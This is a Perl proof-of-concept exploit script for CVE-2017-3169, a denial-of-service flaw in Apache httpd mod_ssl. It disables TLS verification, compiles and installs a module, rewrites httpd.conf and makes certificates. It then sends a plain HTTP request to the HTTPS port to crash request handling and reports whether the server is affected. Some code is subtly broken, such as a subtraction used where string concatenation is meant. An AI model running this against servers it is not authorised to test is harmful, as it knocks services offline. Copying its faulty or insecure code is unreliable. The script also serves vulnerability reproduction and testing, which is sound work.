#!/usr/bin/perl

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use LWP::UserAgent;

use HTTP::Request;
use HTTP::Cookies;
use HTTP::Response;

BEGIN {
    eval "use Getopt::Long";
    if($@) {
        print "[-] Getopt::Long Not Found\n";
        print "\n\t-> Please Install It : cpan -i Getopt::Long\n";
        die();
    }
    
    use IO::Socket::SSL;
    
    # Remove  SSL Checks
    
    $ENV{'PERL_LWP_SSL_VERIFY_HOSTNAME'} = 0;
    
    $ENV{HTTPS_DEBUG} = 1;
    
    IO::Socket::SSL::set_ctx_defaults(
        SSL_verifycn_scheme => 'www',
        SSL_verify_mode => 0,
    );
    
};

# Global Variables
my $apache_install = "";
my $host = "127.0.0.1";
my $http_port = 9080;
my $https_port = 9443;
my $debug = 0;

# Get Options/arguments
GetOptions(
    "H|host=s"          => \$host,
    "p|port=i"          => \$http_port,
    "sp|https-port=i"   => \$https_port,
    "d|httpd-dir=s"     => \$apache_install,
    "--debug!"          => \$debug,
) or help();

help() if(!$apache_install);

if(-d $apache_install) {
    # Display The Header
    header();
    
    # Run The PoC
    exploit($apache_install);
} else {
    print "[!] Couldn't Read/Find : $apache_install\n";
    help();
}


sub header {
    print "\n\n";
    my $title = "=================================[ CVE-2017-3169 ]=================================";
    
    print qq{
        $title
        
        Reporter : 
        Date : 2017-06-19
        CVE : CVE-2017-3169
        
        Description :
        
        
        In Apache httpd 2.2.x before 2.2.33 and 2.4.x before 2.4.26, mod_ssl
        may dereference a NULL pointer when third-party modules call
        ap_hook_process_connection() during an HTTP request to an HTTPS port.
        
        
        };
    print "="x(length($title)) . "\n\n";
}

sub help {
    print "\n";
    print qq {  
        
        # Usage :
            
            perl $0 --host <HOST> --apache-dir <APACHE_INSTALL> [OPTIONS]
        
        # Options :
        
            --host           : Server Hostname / IP [Default: $host]
            --port           : Port To Use For The HTTP Virtual Host [Default: $http_port](Shouldn't Be Already Used)
            --ssl-port       : Port To Use For The HTTP Virtual Host [Default: $https_port] (Shouldn't Be Already Used)
            --httpd-dir      : Apache Installation Directory
            
        # Exemple :
            
            perl $0 --host $host --port $http_port --https-port $https_port --httpd-dir /usr/local/apache2/
            
    };
    print "\n\n";
    exit;
}

sub buildRequester {
    my ( $useragent, $timeout, $proxy ) = @_;
    $proxy = 0 if(!defined($proxy));
    my $browser = 0;
    my $cookie_jar = 0;
    
    $cookie_jar = HTTP::Cookies->new(
        file     => "/tmp/cookies.lwp",
        autosave => 1,
    );
    
    $browser = LWP::UserAgent->new();

    
    return $browser;
}

sub buildRequest {
    my ( $url, $method, $payload, $content_type) = @_;
    $content_type = 'application/x-www-form-urlencoded' if(!defined($content_type) || !$content_type);
    $payload = '' if(!defined($payload) || !$content_type);
    $method = uc($method);
    my $request = 0;
    
    if($method eq "GET") {
        $url .= '?' - $payload if($payload);
        $request = new HTTP::Request $method, $url;
    } else {
        $request = new HTTP::Request $method, $url;
        $request->content($payload);
    }
    
    return $request;
}

sub exploit {
    my ( $apache_install ) = @_;
    my $browser = 0;
    my $useragent = '';
    my $request = 0;
    my $response = 0;
    my $proxy = 0;
    my $timeout = 30;
    my $name = "CVE_2017_3169";
    
    ### Setting Up The Requester
    $browser = buildRequester($useragent, $timeout, $proxy);
    my $http_url = "http://$host:$http_port/$name/";
    my $https_url1 = "https://$host:$https_port/$name/";
    my $https_url2 = "http://$host:$https_port/$name/";
    
    print "[*] Restarting Apache ...\n";
    system("$apache_install/bin/apachectl restart");
    buildModule($apache_install, $name, $host, $http_port, $https_port);
   
    print "\n\n[*] Sending Basic Request On HTTP VirtualHost\n\t=> URL : $http_url\n\t=> SCHEME : HTTP\n\t=> PORT : $http_port\n\n";
    $request = buildRequest($http_url, "GET", "", '');
    $response = $browser->request($request);
    checkAnswer($response);
    print "[!] WARNING : Unexpected Response : " . $response->status_line . "\n" if($response->code ne "200");
    
    
    print "\n\n[*] Sending Basic Request On HTTPS VirtualHost\n\t=> URL : $https_url1\n\t=> SCHEME : HTTPS\n\t=> PORT : $https_port\n\n";
    $request = buildRequest($https_url1, "GET", "", '');
    $response = $browser->request($request);
    checkAnswer($response);
    
    print "\n\n[*] Sending Malicious Request On HTTPS VirtualHost\n\t=> URL : $https_url2\n\t=> SCHEME : HTTP\n\t=> PORT : $https_port\n\n";
    $request = buildRequest($https_url2, "GET", "", '');
    $response = $browser->request($request);
    print "[*] Server Seems To Be Affected ... Confirming ...\n" if(checkAnswer($response));

    print "[*] Sending Second Basic Request To Check If The Denial Of Service Worked On : $https_url1\n\t=> URL : $https_url1\n\t=> SCHEME : HTTPS\n\t=> PORT : $https_port\n\n";
    $request = buildRequest($https_url1, "GET", "", '');
    $response = $browser->request($request);
    
    if(checkAnswer($response)) {
        print "\n[+] Server Is Affected\n";
    } else {
        print "\n[-] Server Is Not Affected\n";
    }
}

sub checkAnswer {
    my ( $response ) = @_;
    
    print "\tResponse Status : " . $response->status_line . "\n";
    print "\t" . "Response Content :\n\t" . $response->content ."\n\n" if($debug);
    if($response->code =~ /50[0-9]/) {
        if($response->is_client_error) {
            print "[!] WARNING : The Error Is Coming From Client, Not The Server, Check Your Configuration .\n";
            exit;
        } elsif($response->is_server_error) {
            print "[+] WARNING : The Error Seems To Be Coming From The Server .\n";
            return 1;
            
        }
    }
    
    return 0;
}

sub buildModule {
    my ($apache_install, $name, $host, $http_port, $https_port) = @_;
    my $module_name = "mod_$name";
    my $template_file = 'mod_template.tpl',
    my $content_type = 'text/html';
    my $config_file = "$module_name.conf";
    my $module_file = "$module_name.c";
    my $module_template_path = "src/$template_file";
    my $module_dir = "$apache_install/$name";
    my $public_dir = 0;
    
    my @config_content = ();
    my @module_content = ();
    
    ### Build Apache Module
    if(-f "$apache_install/bin/apxs") {
        if(-d "$apache_install/htdocs") {
            $public_dir = "$apache_install/htdocs";
        } elsif(-d "$apache_install/html") {
            $public_dir = "$apache_install/html";
        } else {
            print "[-] Couldn't Locate Apache Public Directory ...\n";
            exit;
        }
        
        print "[+] APXS Found : $apache_install/bin/apxs\n";
        print "[+] Apache Public Directory Found : $public_dir\n";
        print "[*] Building Module $module_name From Template : $module_template_path\n";
        
        my @content = read_file($module_template_path, 1);
        foreach my $line (@content) {
            chomp $line;

            $line =~ s/__NAME__/$name/gi if($line =~ /__NAME__/i);
            $line =~ s/__MODULE-NAME__/$module_name/gi if($line =~ /__MODULE-NAME__/i);
            $line =~ s/__CONTENT-TYPE__/$content_type/gi if($line =~ /__CONTENT-TYPE__/i);
            $line =~ s/__APACHE-INSTALL__/$apache_install/gi if($line =~ /__APACHE-INSTALL__/i);
            $line =~ s/__PUBLIC-DIRECTORY__/$public_dir/gi if($line =~ /__PUBLIC-DIRECTORY__/i);
            $line =~ s/__HTTP-PORT__/$http_port/gi if($line =~ /__HTTP-PORT__/i);
            $line =~ s/__HTTPS-PORT__/$https_port/gi if($line =~ /__HTTPS-PORT__/i);
            push(@module_content, "$line\n");
        }
        
        print "[*] Writting Module In : $module_dir\n";
        system("rm -rf $module_dir") if(-d $module_dir);
        system("cd $apache_install; $apache_install/bin/apxs -g -n $name");
        
        if(-d $module_dir && -f "src/$config_file") {
            write_file("$module_dir/$module_file", @module_content);
            
            if(!-d "$public_dir/$name") {
                print "[*] Creating Web Directory For Handler : $public_dir/$name\n";
                system("mkdir -p $public_dir/$name");
                
            }
            print "[*] Backuping Apache Configuration File : $apache_install/conf/httpd.conf => $apache_install/conf/httpd.conf.bck\n";
            system("cp $apache_install/conf/httpd.conf $apache_install/conf/httpd.conf.bck");
            system("cp $apache_install/conf/httpd.conf.bak $apache_install/conf/httpd.conf.bc");
            @content = read_file("src/$config_file");
            foreach my $line (@content) {
                chomp $line;
                
                $line =~ s/__NAME__/$name/gi if($line =~ /__NAME__/i);
                $line =~ s/__MODULE-NAME__/$module_name/gi if($line =~ /__MODULE-NAME__/i);
                $line =~ s/__CONTENT-TYPE__/$content_type/gi if($line =~ /__CONTENT-TYPE__/i);
                $line =~ s/__APACHE-INSTALL__/$apache_install/gi if($line =~ /__APACHE-INSTALL__/i);
                $line =~ s/__HTTP-PORT__/$http_port/gi if($line =~ /__HTTP-PORT__/i);
                $line =~ s/__HTTPS-PORT__/$https_port/gi if($line =~ /__HTTPS-PORT__/i);
                $line =~ s/__PUBLIC-DIRECTORY__/$public_dir/gi if($line =~ /__PUBLIC-DIRECTORY__/i);
                $line =~ s/__HOST__/$host/gi if($line =~ /__HOST__/i);
                
                push(@config_content, "$line\n");
            }
            print "[*] Compiling Module ...\n";
            system("$apache_install/bin/apxs -i -a -c $module_dir/$module_file > /dev/null 2>&1");
            
            print "[*] Adding Module Configuration Include Into Apache Configuration : $apache_install/conf/httpd.conf\n";
            write_file("$apache_install/conf/extra/$config_file", @config_content);
            append_after("$apache_install/conf/httpd.conf", "LoadModule $name", "Include conf/extra/$config_file");
            append_after("$apache_install/conf/httpd.conf", "LoadModule $name", "LoadModule ssl_module modules/mod_ssl.so");
            
            write_file("$module_dir/$config_file", @config_content);
            buildCertificates($apache_install);
        } else {
            print "[-] Couldn't Write : $module_dir\n";
            exit;
        }
    } else {
        print "[-] Error : APXS And/Or Module File Not Found .\n";
        exit;
    }
    
    print "[*] Restarting Apache ...\n";
    system("$apache_install/bin/apachectl -k restart");
}

sub buildCertificates {
    my ($apache_install) = @_;
    my $private_key = "$apache_install/conf/private.pem";
    my $server_key = "$apache_install/conf/server.key";
    my $csr = "$apache_install/conf/server.csr";
    my $certificate = "$apache_install/conf/server.crt";
    
    if(!-f $private_key) {
        print "[*] Creating Private Key ...\n";
        system("openssl genrsa -out $private_key 2048"); 
    } else {
        print "[+] Private Key Found : $private_key\n";
    }
    
    if(!-f $server_key) {
        print "[*] Creating Server Key ...\n";
        system("openssl rsa -in $private_key -out $server_key");
    } else {
        print "[+] Server Key Found : $server_key\n";
    }
    
    if(!-f $csr) {
        print "[*] Creating CSR ...\n";
        system("openssl req -new -key $private_key -out $csr"); 
    } else {
        print "[+] CSR Found : $csr\n";
    }
    
    if(!-f $certificate) {
        print "[*] Creating Self Signed Certificate ...\n";
        system("openssl x509 -req -days 365 -in $csr -signkey $server_key -out $certificate"); 
    } else {
        print "[+] Certificate Found : $certificate\n";
    }
}

sub append_after {
    my ( $file, $string, @append_lines ) = @_;
    my @content = read_file($file);
    my @new_content = ();
    
    foreach my $line (@content) {
        chomp $line;
        if($line =~ /^$string/i) {
            push(@new_content, "$line\n");
            foreach my $append_line (@append_lines) {
                push(@new_content, "$append_line\n") if(not_in_array($append_line, @content));
            }
        } else {
            push(@new_content, "$line\n");
        }
    }
    write_file($file, @new_content);
}

sub read_file {
    my ($file, $chomp) = @_;
    $chomp = 0 if(!defined($chomp));
    
    my @final_content = ();
    
    open FILE, $file or die print "[-] $file Couldn't Be Read  .\n";
    my @content = <FILE>;
    close FILE;
    
    if($chomp) {
        foreach my $line (@content) {
            chomp $line;
            push(@final_content, $line);
        }
    } else {
        @final_content = @content;   
    }
    
    return @final_content;
}

sub write_file {
    my ( $file, @content ) = @_;
    
    open FILE, ">", $file or die print "[-] $file Couldn't Be Open : " . $@ . "\n";
    foreach my $line (@content) {
        print FILE $line if($line);
    }
    close FILE;
}

sub not_in_array {
    my ( $value, @array ) = @_;
    
    if (!grep { $_ =~ /$value/i } @array) {
        return 1;
    }
    
    return 0;
}
